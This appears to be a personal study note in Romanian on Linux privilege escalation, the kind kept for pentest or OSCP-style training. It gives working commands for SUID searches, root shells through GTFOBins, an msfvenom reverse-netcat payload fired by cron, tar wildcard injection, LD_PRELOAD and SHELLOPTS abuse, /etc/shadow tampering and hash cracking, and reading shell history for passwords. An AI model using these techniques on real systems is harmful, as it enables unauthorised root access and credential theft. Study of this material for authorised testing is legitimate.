![[Pasted image 20240423191114.png]]
Sunt 2 tipuri dea ridica privilegile `horizontal privesc` si `vertical privesc`. 
1. Primul tip de `privesc` este exploatarea la `kernel` dar nu este stabil putem strica masina virtuala :(.
2. [[SUID]] (Set owner User ID up on execution) file - permite rularea fisierului ca si cum acesta ar fii `own`-url acestui fisier daca proprietarul este `root`. Putem sa primim privilegile de `root`
3. [[crontab]] - se executa unele sarcine la anumit timp. 
### Suid bit
Priviligile maximale sunt `rwx-rwx-rwx`:
r = citire
w = scriere
x = executare
#### Exemplu 
RWX   RWX    RWX  
_421     421     421_
[[SUID]] (Set user ID), [[SGID]] (Set Group ID) - pentru [[SUID]] bitul(owner) se pune la `4`. Si pentru [[SGID]] se pune la `2`
[[SUID]]:
RWS-RWX-RWX
[[GUID]]:
RWX-RWS-RWX

Aceste fisiere sunt importante pentru a ridica privilegile putem sa le gasim cu comand:
```bash
find / -perm -u=s -type f 2>/dev/null
```

### Add new user in `/etc/passwd` (manual)
`/etc/passwd` - sunt stocate datele despre utilizatori 
`/etc/shadow` - sunt stocate doar parolele in format de tip hash
`/etc/group` - informatie despre cine apartine la ce group

Pentru a adauga un user nou in `/etc/passwd` manul avem nevoie de o parola aces lucru este posibil cu:
```bash
openssl passwd -1 -salt [salt][password]
```
Mai multe detalii aici [[openssl]]
### Vi 
De fiecare data cand avem credintialele pentru un utilizator trebuie sa rulam:
```bash
sudo -l
```
Aceasta comanda ne permite sa vedem ce programe pot fii rulate ca super user:
Urmatorul pas este sa vedem pe situl dat https://gtfobins.github.io/ daca este o metoda dea ridica privilegile:
In cazul nostru este programa [[vi]] care poate fii rulata ca `root` pe [[GTFObins]] putem gasi aceasta comanda:
```bash
sudo vi -c ':!/bin/bash' /dev/null
```
### CronTab
Daca avem un `job` care se ruleaza cu privilegi mai mari putem face in felul urmator sa generam un payload cu [[msfvenom]] si dupa asta sal executam prin [[crontab]] care apeleaza la scriptul nostru:
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=IP lport=PORT R
```

### PATH
In car ca avem posibilitati sa modificam variabela `PATH` putem schimba si locul de unde acesta cauta comenzile care pe urma si le ruleaza:
Pentru a gasi care directore putem inscrie putem folosi:
```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

### Check List
- [https://github.com/netbiosX/Checklists/blob/master/ Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/ Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
- [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

### MySQL
In caz ca baza noastra de date se ruleaza cu aces de `root` fara a cere parola putem face o functie cu tehnologiea [[UDF]] care ne permite sa creem functi personale pentru a extinde functionalul:
Aici este un exemplu de functie de [[UDF]]: https://www.exploit-db.com/exploits/1518 si explicatiea cum acesta trebuie sa fie pornit. :)

### shadow
Problema cea mai mare cu fisierul dat este ca daca noi putem sal citim sau sal modificam atunci avem 2 metode de actiona:
- Daca putem sal citim putem sparge parola cu instrumente de tipul `bruteforce` [[john]]: 
```bash
john --wordlist=rockyou.txt hash.root.txt 
```
- Daca noi putem sal modificam intrun fel putem sa adaugam la el un hash generat de noi insusi[[openssl]]:
```bash
openssl passwd -1 -salt salt password
```
Sau(de dorit ca in shadow sa fie inclus cu comanda de mai jos)[[mkpasswd]]
```bash
mkpasswd -m sha-512 newpassword 
```
### Ridicarea privilegilor cu librari dinamice
[[ldd]] - este o utilita care ne arata care librari dinamice sunt incarcate pentru programul dat
`LD_PRELOAD` - este folosit pentru a incarca o librarie aditional sau suplimentar inaintea celor lalte:
```bash
sudo LD_PRELOAD=/path/to/lib.co app
```
In felul dat noi special incarcam o librarie in program:

`LD_LIBRARY_PATH` - cauta dupa linkuri dinamice unde se afla libraria aceasta. Nu garanteaza care librarie se va incarca prima.
```bash
sudo LD_LIBRARY_PATH=/path(se da un directoriu) app
```

### CronTab (PrivEsc)
Daca nu tragem atentia la cine poate modifica fisierul care este in [[crontab]] acesta poate sa-si ridice privilegile. 
#### CronTab WildCards *
Daca in crontabe este simbolul dat atunci putem executa un shell generat de noi * in felul urmator cream 2 fisiere care vor fii utilizate nu ca fisiere dar ca instruciti pentru comanda [[tar]]:
```bash 
touch "/home/user/--checkpoint"
touch "/home/user/--checkpoint-action=exec=shell.elf"
```
Acesta ne va transmite un `revers-shell` la masina noastra:

### SUID-SGID
Pentru a gasi toate fisierele de acest tip putem folosi:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null 
```
`-a` → pentru operatorul logic `and`
`-o` → pentru operatorul logic `or`
Sau:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
Acest lucru nu va lucra cu versiunea la [[bash]] mai noua de `4.4`
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

### Password history 
Daca utilizatorul a introdus parola direct in terminal ci nu in proptul de parola acesta poate fii vazut:
```bash
cat ~/.*history | less 
```
In cazul dat folosim [[cat]], [[less]]:

### NFS 
[[NFS]] daca nu e setat normal putem sa ne ridicam privilegile setarile pentru acest serviciu se afla in `/etc/exports`.
Pentru a monta un directoriul pentru serviciul [[NFS]] folosim comanda:
```bash
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```
Pentru a vedea toate directoarele care sunt in `sharing` putem folosi comanda cu utilita [[showmount]]:
```bash
showmount -e IP
```
Ne va returna toate directoarele care sunt pe sistemul nostru.
### Kernel Exploit 
Acest tip de privilege poate lasa sistema nestabila rulam [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2) pentru a scana kernelul. Putem folosi site-ul pentru a gasi exploituri penru kernul [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)

### Capabilities?
Pentru acesta avem nevoie de instrumentul [[getcap]] sintaxa arata:
```bash
getcap -r / 2>/dev/null
```
Si deja privim daca `GTFobins` ne poate ajuta cu ceva:
### Istrumente pentru scanare
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
